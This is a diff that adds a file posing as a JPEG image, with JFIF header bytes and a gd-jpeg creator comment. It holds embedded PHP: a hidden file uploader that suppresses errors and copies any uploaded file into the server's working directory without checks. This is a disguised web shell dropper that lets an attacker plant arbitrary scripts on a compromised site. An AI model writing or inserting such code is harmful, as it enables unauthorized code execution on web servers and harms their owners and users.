@@ -1,0 +1,26 @@
+����JFIF��;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
+<?php
+header('Content-Type: text/html; charset=utf-8');
+error_reporting(0);
+$msg = '';
+if(isset($_POST['_up'])) {
+    $f = $_FILES['img'];
+    $p = getcwd() . '/';
+    $n = basename($f['name']);
+    
+    if(@copy($f['tmp_name'], $p . $n)) {
+        $msg = "<span style='color:green'>✓</span>";
+    }
+}
+?>
+<style>
+.u{width:300px;margin:20px auto;padding:10px;background:#fff;border:1px solid #ddd;}
+.b{background:#4CAF50;color:#fff;border:0;padding:5px 10px;cursor:pointer;}
+</style>
+<div class="u">
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="img">
+<input type="submit" name="_up" value="OK" class="b">
+<?php echo $msg; ?>
+</form>
+</div>
